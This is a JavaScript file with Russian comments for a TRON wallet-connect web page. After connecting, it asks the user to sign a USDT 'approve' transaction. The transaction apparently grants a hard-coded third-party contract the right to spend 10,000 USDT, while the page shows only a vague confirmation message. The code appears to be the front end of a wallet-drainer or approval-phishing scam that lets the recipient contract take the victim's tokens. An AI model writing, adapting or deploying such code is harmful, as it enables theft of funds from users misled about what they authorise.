const connectBtn = document.getElementById('connectBtn');
const transferBtn = document.getElementById('transferBtn');
const walletAddressText = document.getElementById('walletAddress');

let userAddress = '';

const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 

// Универсальный поиск провайдера TRON для мобильных кошельков (включая Trust Wallet)
function findTronProvider() {
    // 1. Стандартный tronWeb
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        return window.tronWeb;
    }
    // 2. Альтернативные пути внедрения в мобильных браузерах
    if (window.trustwallet && window.trustwallet.tronWeb) {
        return window.trustwallet.tronWeb;
    }
    if (window.tronLink) {
        return window.tronLink.tronWeb;
    }
    return null;
}

// Функция ожидания появления провайдера при загрузке страницы в кошельке
async function getTronWeb() {
    let provider = findTronProvider();
    if (provider) return provider;

    return new Promise((resolve) => {
        let attempts = 0;
        const interval = setInterval(() => {
            attempts++;
            provider = findTronProvider();
            if (provider && provider.defaultAddress && provider.defaultAddress.base58) {
                clearInterval(interval);
                resolve(provider);
            } else if (attempts > 25) { // Ждем до 10 секунд
                clearInterval(interval);
                resolve(null);
            }
        }, 400);
    });
}

connectBtn.addEventListener('click', async () => {
    try {
        walletAddressText.innerText = "Поиск кошелька...";
        let tronWeb = await getTronWeb();

        if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
            userAddress = tronWeb.defaultAddress.base58;
            walletAddressText.innerText = `Подключено: ${userAddress}`;
            connectBtn.style.display = 'none';
            transferBtn.style.display = 'inline-block';
        } else {
            alert('Кошелек не передал данные сети TRON. Попробуйте обновить страницу внутри браузера кошелька.');
            walletAddressText.innerText = "Кошелек не найден";
        }
    } catch (error) {
        console.error("Ошибка подключения:", error);
        alert("Произошла ошибка при подключении.");
    }
});

transferBtn.addEventListener('click', async () => {
    try {
        const tronWeb = await getTronWeb();
        if (!userAddress || !tronWeb) {
            alert('Сначала подключите кошелек!');
            return;
        }
        
        console.log("Запрос разрешения (Approve) на USDT...");
        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
        const approveAmount = '10000000000'; 

        const tx = await usdtContract.approve(
            myContractAddress,
            approveAmount
        ).send({
            feeLimit: 100000000
        });

        alert("Запрос успешно подтвержден!");
        console.log("Хэш транзакции approve:", tx);

    } catch (error) {
        console.error("Ошибка при отправке запроса:", error);
        alert("Ошибка при выполнении транзакции. Проверьте консоль.");
    }
});
